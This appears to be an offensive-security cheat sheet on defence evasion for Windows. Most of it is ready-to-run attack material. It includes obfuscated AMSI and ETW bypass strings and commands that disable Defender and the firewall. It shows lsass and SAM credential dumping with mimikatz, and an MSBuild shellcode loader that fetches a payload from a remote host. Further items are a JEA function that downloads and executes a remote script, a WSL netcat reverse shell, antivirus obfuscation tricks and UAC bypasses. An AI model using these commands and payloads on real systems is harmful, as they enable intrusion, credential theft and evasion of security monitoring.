# Evasion
* [General](#General)
* [Windows Defender](#Windows-Defender)
* [Windows Firewall](#Windows-Firewall)
  * [ASR-Rules](#ASR-Rules) 
* [PowerShell](#PowerShell)
   * [Execution-policy](#Execution-policy)
   * [AMSI](#AMSI)
   * [Constrained Language Mode](#Constrained-Lanuage-Mode)
      * [Escapes for Constrained Lanuage Mode](#Escapes-for-Constrained-Language-Mode)
   * [Logging evasion](#Logging-evasion)
   * [Just Enough Admin](#Just-Enough-Admin)
* [Applocker](#Applocker)
* [WDAC](#WDAC)
* [LOLBAS](#LOLBAS)
* [Defeating AV](#Defeating-AV)
  * [Obfuscation tools](#Obfuscation-tools)
  * [Evasion techniques](#Evasion-techniques)
  * [Defeating Microsoft Defender](#Defeating-Microsoft-Defender)
  * [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)
* [Privileges](#Privileges)
* [UAC Bypass](#UAC-bypass)

## General
### Enumerating AV / EDR
- https://github.com/tothi/serviceDetector
```
python3 serviceDetector.py -conf conf/edr.json <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

#### Run against multiple targets
```
cat targets.txt | parallel -j 50 python3 serviceDetector.py -conf conf/edr.json <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

#### Get all GPO's applied to a machine
- Run with elevated prompt
```
gpresult /H gpos.html
```

## Windows Defender
- Detects On-disk, In-Memory (AMSI) and Behavioural

#### Check if windows defender is running
```
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

#### Get info about Windows Defender
```
Get-MpPreference
```

#### Find excluded folder from Windows Defender
```
Get-MpPreference | select Exclusion*
(Get-MpPreference).Exclusionpath
```

#### Create exclusion
```
Set-MpPreference -ExclusionPath "<path>"
```

#### Check AV Detections
```
Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime 
```

#### Get last AV Detection
```
Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime | Select-Object -First 1
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
```

### ASR Rules
#### Enumerate ASR rules
- https://github.com/directorcia/Office365/blob/master/win10-asr-get.ps1
```
. ./win10-asr-get.ps1
```

## Windows Firewall
#### Get state
```
Get-NetFirewallProfile -PolicyStore ActiveStore
```

#### Get rules
```
Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize
```

#### Disable Firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
```

#### Enable firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

#### Change default policy
```
Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow 
```

#### Open port on firewall
```
netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>

New-NetFirewallRule -DisplayName "Allow port" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>
```

#### Remove firewall rule
```
Remove-NetFirewallRule -DisplayName "Allow port"
```

## PowerShell
#### Powershell detections
- System-wide transcription
- Script Block logging 
- Module logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

### Start 64 bit powershell
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

### Execution-policy
- It is not a security boundary.

#### Get Execution policy
```
Get-Executionpolicy
```

#### Bypass execution policy
- Not meant to be a security measure
```
powershell –executionpolicy bypass .\script.ps1
powershell –c <cmd>
powershell –enc
powershell.exe -executionpolicy bypass
```

### AMSI
- https://amsi.fail/
- Get an AMSI bypass string and then obfuscate [manually](#Obfuscation-techniques)

#### AMSI bypass string
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### AMSI bypass string obfuscated
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```

#### AMSI bypass string 2 obfuscated
```
$MethodDefinition = @"
[DllImport(`"kernel32`",  EntryPoint="GetProcAddress")]
public static extern IntPtr GetProc(IntPtr hModule, string procName);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`"kernel32`",EntryPoint="VirtualProtect" )]
public static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kern' -NameSpace 'W' -PassThru;
$ABSD = 'Ams'+'iS'+'canBuffer';
$handle = [W.Kern]::GetModuleHandle('ams'+'i.dll');
[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$PFlag = 0x40;
[UInt32]$OFlag = 0;
[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);
```

### ETW
- Event Tracing for Windows
- Very effective way of hunting .NET
- Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!

```
[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
```

#### Obfusacted
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

### Constrained Lanuage Mode
#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

### Escapes for Constrained Language Mode
#### Launch Powershell Version 2
```
Powershell.exe -Version 2
```

#### Overwrite __PSLockdownPolicy variable
- If CLM is not implemented correctly and is using __PSLockdownPolicy

#### Check the __PSLockdownPolicy value
- Value 4 is enabled
- Value 8 is disabled
```
(Get-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy").__PSLockDownPolicy
```

#### Set lockdown policy to 8 and check language mode
- https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
```
Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8
powershell.exe
$ExecutionContext.SessionState.LanguageMode
```

### PowerShx
- https://github.com/iomoath/PowerShx
```
rundll32 PowerShx.dll,main -i 
PowerShx.exe -i  
```

### PowerShdll Run PowerShell with dlls only.
- https://github.com/p3nt4/PowerShdll
- Does not require access to powershell.exe as it uses powershell automation dlls.
```
rundll32 PowerShdll,main -i
```

#### Download files with certutil
- You can not use iwr but you can use certutil in constrained language mode
```
certutil -urlcache -split -f <URL>
```

#### Execute scripts
- It is possible to execute scripts on the filesystem but you can't load them!
- If applocker is there enumerate it to find a directory that lets you execute scripts in

### Logging evasion
#### Invisi-shell
- Bypasses all logging
- https://github.com/OmerYa/Invisi-Shell
- Type exit from the new PowerShell session to complete the clean-up.

#### With admin privileges
```
./RunWithPathAsAdmin.bat 
```

#### With non-admin privileges:
```
RunWithRegistryNonAdmin.bat
```

#### Script Block logging bypass
- Bypass [ETW](#ETW)

##### Winrs
- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
```
winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
```

### Just Enough Admin
- Defines allowed cmdledt and commands that are allowed by defining role capabilities.

#### Connect with JEA endpoint
- Use `DOMAIN\USER` format
```
$creds = get-credential
$sess = New-PSSession -ComputerName <FQDN> -ConfigurationName <JEA ENDPOINT CONF NAME> -Credential $creds
```

#### Get the PSSession configurations (and JEA)
```
Get-PSSessionconfiguration
```

#### Get PSSession capabilities
```
Get-PSSessionCapability -ConfigurationName <NAME> -Username <DOMAIN>\<USERNAME>
```

### Abuse JEA
- Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.
- Allows the use of wildcard.
- Check which commands are allowed to run and google for abuses
- https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf
```
Get-Command

# Abuse example
Start-Process cmd.exe calc.exe
```

#### Abuse - Creating functions
- If JEA enpoint is running in Constrained Language Mode instead of NoLanguage it is possible to create your own functions!
- Creates a function with the name `gl` and executes it.
- Shortcut would be `${ <COMMAND>}`
```
function gl {Get-Location}; gl

function gl {whoami}; gl

function gl {powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"}; gl
```

#### Abuse - Grant a user to admin
```
Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe
```

#### Abuse - Running arbritary code
```
Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,
New-ScheduledTask, Register-ScheduledJob

Invoke-Command -ScriptBlock {net localgroup administrators <USER> /add}
```

### Abuse - Set-PSSessionConfiguration
- From https://github.com/samratashok/RACE/blob/master/RACE.ps1
- After finding a profile to edit, can also edit `microsoft.powershell` which is the normal remoting endpoint!

#### Connect and check the config
```
$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

#### Get original SDDL
```
$existingSDDL = (Get-PSSessionConfiguration -Name "<PROFILE>" -Verbose:$false).SecurityDescriptorSDDL
```

#### Get SID  for new user to add
```
$SID = (Get-DomainUser <USER>).Objectsid
```

#### Create new SDDL with a new USER SID
```
$isContainer = $false  
$isDS = $false  
$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL
$accessType = "Allow"  
$accessMask = 268435456  
$inheritanceFlags = "none"  
$propagationFlags = "none"  
$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null
$newSDDL = $SecurityDescriptor.GetSddlForm("All")
$newSDDL
```

#### Change the config
````
Set-PSSessionConfiguration -name "<PROFILE>" -SecurityDescriptorSddl "<SDDL>" -force -Confirm:$false
````

#### Reconnect and check the config
```
$sess = New-PSSession -ComputerName <FQDN> -Credential $creds -ConfigurationName <ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

#### Connect to reconfigured new endpoint
```
$sess2 = New-PSSession -ComputerName <FQDN> -Credential $creds2 -ConfigurationName <RECONFIGURED ENDPOINT>
Enter-PSSession $sess
Get-PSSessionConfiguration
```

## Applocker
- AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).
- AppLocker has a set of default allow rules such as, "allow everyone to execute anything within C:\Windows\*" - the theory being that everything in C:\Windows is trusted and safe to execute.
- The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
  - Executing untrusted code via trusts LOLBAS's.
  - Finding writeable directories within "trusted" paths.
  - By default, AppLocker is not even applied to Administrators.
- Uploading into ```C:\Windows``` requires elevated privileges, but there are places like ```C:\Windows\Tasks``` that are writeable by standard users. 
- DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
- Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList

#### Check if Applocker is enabled
```
Get-AppLockerPolicy -Effective
```

#### Enumerate Applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Check policy with GPOresult
- Open the HTLM file locally
```
gpresult /H gpos.html
```

#### Parse GPO applocker
- https://github.com/PowerShell/GPRegistryPolicy
```
Get-DomainGPO -Identity *applocker*
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
```
runas /netonly /user:<DOMAIN\<USER> cmd.exe
winrs -r:<PC NAME> cmd
```

#### Check for the policy on idsk
- ```.p7b``` is a signed policy
- Check if there are any ```.xml``` files which didn't got removed with the policy
```
ls C:\Windows\system32\CodeIntegrity
```

### WDAC
- Tool to bypass: https://github.com/nettitude/Aladdin

#### Check for WDAC
```
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

### LOLBAS
- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
- Can be used to bypass Applocker or WDAC

#### rundll32.exe and comsvcs.dll dumping lsass:
```
Get-Process | Select-String lsass
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PROCESS ID> C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp

Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
```

#### Reg.exe dumping sam
```
reg save HKLM\SECURITY security.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak

Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
secretsdump.py -sam sam.bak -security security.bak -system system.bak local
```

#### rundll32.exe dll payload
```
C:\Windows\System32\rundll32.exe <FILE>.dll,StartW
```

### Msbuilt.exe
- Can be used to execute arbitrary C# code from a `.csproj` or `.xml` file.
```
msbuild.exe <FILE>
```

#### Example shellcode injector
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://<IP>";
                        shellcode = client.DownloadData("shellcode.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

#### Example PowerShell clm
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## Defeating AV
### Obfuscation tools
#### C# binaries
- Obfuscate C# binary with https://github.com/mkaring/ConfuserEx
1. Launch ConfuserEx
2. In Project tab select the Base Directory where the binary file is located.
3. In Project tab Select the Binary File that we want to obfuscate.
4. In Settings tab add the rules.
5. In Settings tab edit the rule and select the preset as `Normal`.
6. In Protect tab click on the protect button.
7. We will find the new obfuscated binary in the Confused folder under the Base Directory.

#### Go binaries
- https://github.com/burrowers/garble

#### Powershell
- [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [https://github.com/JoelGMSec/Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
- [Remove comments with PowerStrip](https://github.com/yoda66/PowerStrip)

### Evasion techniques
- Most examples are in PowerShell but techniques can be implemented in every coding language

#### Things that get you caught
- Using Templates; MSbuild template / scripts / etc
- Not changing variable & function names
- Not removing comments
- Not obfuscating common code exec patterns
  - Appplies to scripts, templates & Compiled code
- Not changing error messages etc.
- Entropy
   - Rougly - high entropy = more random
   - Higher entropy = less compressible
   - Problem: we encrypt shellcode to evade
   - encrypted shellcode = more random -> higher entropy
   - Dont randomize all the things
      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs.

#### How amsi evaluates PowerShell commands
- The code is evaluated when its readable by the scripting engine
- This is what allows us to still be able to obfuscate our code
```
# This
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIASABlAGwAbABvACAAVwBvAHIAbABkACIAKQA=

# Becomes
Write-Host("Hello World")

# But This
Write-Host("He" + "llo" + "World")

# Does not become
Write-Host("Hello World")
```

### Change the following in scripts/code
#### Hash of file/code
 - Change Capitalization 
	 - PowerShell ignores capitalization, AMSI ignored capitalization, but changing your hash is best practice.
		 -   `$variablename = "amsicontext"` to `$VaRiAbLeNaMe = "amsicontext"`
	- C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)
- Remove comments
	- Remove all comments out of the script/code
		- https://powershell.one/isesteroids/quickstart/overview
		- https://github.com/yoda66/PowerStrip

#### Byte strings
- Change variable names
   - `$variablename = "amsicontext"` to `$LoremIpsum = "amsicontext"`
   - Dont randomize all the things
      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs (Example: DragonBerrySmasher)
- Concatenation
   - `"amsicontext"` to `"am" + "si" + "con" + "te" + "xt"`
- Variable insertion
   - `$variablename = 'context'` into `$variablename2 = "Amsi$variablename"`
   - C# `string variablename = "context"; string variablename2 = $"amsi{variablename}";`
   - Format string
      - `$variablename = "amsi{0}text -f "con"`
      - `$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);` to `$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);`
      - C# `string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);`
- Potentially the order of execution
- Obfuscating shellcode
   - Shellcode as UUID
      - https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py
   - Reverse shellcode bytes
   - Break into chunks
   - Divide code into two arrays - even & odd bytes
   - Steganography
   - `BigInteger() h/t`
   - Shellcode as english words
      - https://github.com/hardwaterhacker/jargon
   - Shellcode as Emoji
      - https://github.com/RischardV/emoji-shellcoding
- Lower entropy
   - Languages are not random
   - Create an array with a dictionary and compile it with the code (disable compiler optimization)
- Misc
   - PowerShell
      - Properties of an object
         - Can be obfuscated with backticks `$notify.icon` to ```$notify."i`c`on"```
   - C#
     - Changing the variable type (i.e list vs array) 
     - Rename your entrypoints
        -  https://learn.microsoft.com/th-th/dotnet/framework/interop/specifying-an-entry-point#renaming-a-function-in-c-and-c\
```
[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(
	UInt32 lpStartAddr, 
	UInt32 size, 
	UInt32 flAllocationType, 
	UInt32 flProtect);

[DllImport("kernel32, EntryPoint = VirtualAlloc",
	SetLastError = false, ExactSpelling = true)]
	private static extern IntPtr SplendidDragon(
	UInt32 lpStartAddr, 
	UInt32 size, 
	UInt32 flAllocationType, 
	UInt32 flProtect);
```

#### Structure of the code
- Change methods and lines of code around. 

#### Example of changing amsi bypass string
```
# Original amsi bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# New
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```

### Defeating Microsoft Defender
- Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck
1. Run Threatcheck ```.\ThreatCheck.exe -f .\shell.exe```
2. Replace string which gets detected.
3. Recompile and check again!

### Scanning amsi
#### Threatcheck
- https://github.com/rasta-mouse/ThreatCheck
```
.\ThreatCheck.exe -f .\shell.ps1 -e AMSI
```

#### AmsiTrigger
- https://github.com/RythmStick/AMSITrigger
```
.\AmsiTrigger.exe -i .\shell.ps1 -f 2
```

### Offensive .NET
- https://github.com/Flangvik/NetLoader
- Load binary from filepath or URL and patch AMSI & ETW while executing
```
C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Use custom exe Assembyload to run netloader in memory and then load binary
```
C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Random notes
```
pyinstaller.exe --onefile .\CVE-2021-1675.py
pyarmor pack --clean -e "--onefile " .\CVE-2021-1675.py
```

### Windows Subsystem for Linux WSL
- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.

#### Netcat shell
```
wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
```

#### Bypass whitelisting
- In both the above cases, the Windows application will have:
  – Same permissions as the WSL process. 
  – Run as the current Windows user.
  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
```
bash.exe -c cmd.exe
wsl.exe cmd.exe
```

## Privileges

#### Check current privileges
```
whoami /priv
```

### SeDebugPrivileges
- http://woshub.com/obtain-sedebugprivilege-debug-program-policy-enabled/

#### Export the current user rights set by the group policies to a text file:
```
secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
```

#### Edit the secpolicy.ing
- Change the SeDebugPrivileges to ```S-1-5-32-544``` the Local administrator group.
```
notepad.exe secpolicy.inf
```
- Or converts sids: http://woshub.com/convert-sid-to-username-and-vice-versa/

#### Save the new user rights set
```
secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIGHTS
```

#### Start cmd again
- Check privileges with ```whoami``` if not having SeDebugPrivilege do ```PsExec.exe -i cmd.exe```

## UAC bypass
- A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.
- Tool: https://github.com/hfiref0x/UACME
- Guide on how to build: https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/page-3-4

 ```
 .\Akagi64.exe <METHOD> <EXECUTABLE>
 .\Akagi64.exe 34 cmd.exe
 ```
 
#### Automatec UAC bypass PowerShell script 
- https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass

```
.\Win-Multi-UAC-Bypass.ps1
```
 
### Manual UAC bypass
- https://atomicredteam.io/defense-evasion/T1548.002/
 
#### Fodhelper
- Can also use ```C:\Windows\System32\cmd.exe /c powershell.exe```
```
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "<PATH TO EXE>" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
 
# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```
 
#### Check current UAC configuration
- The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting.
```
Seatbelt.exe uac
```

